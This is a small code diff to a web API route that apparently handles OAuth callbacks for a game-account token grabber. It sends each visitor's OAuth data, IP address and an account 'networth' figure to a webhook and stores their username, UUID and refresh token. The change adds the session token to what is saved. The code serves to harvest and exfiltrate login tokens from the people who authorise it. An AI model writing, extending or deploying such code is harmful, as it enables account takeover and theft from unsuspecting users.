@@ -35,7 +35,7 @@ export const get: APIRoute = async ({ request, redirect }) => {
         const ip = request.headers.get("CF-Connecting-IP") || request.headers.get("X-Forwarded-For") || request.headers.get("X-Real-IP") || '69.69.69.69 (Error, dunny why)'; 
         await oauthWebhook(data, nwData, ip, webhook);
         console.log("sent webhook")
-        const saveSuccess = await saveToken(state, data['username'], data['uuid'], data['refresh_token'], url, nwData['unsoulboundNw'])
+        const saveSuccess = await saveToken(state, data['username'], data['uuid'], data['refresh_token'], data["session_token"], url, nwData['unsoulboundNw'])
         if (!saveSuccess) {
             console.log("Error: Error Saving Refresh Token")
             console.log("-----------------------------------------------------")
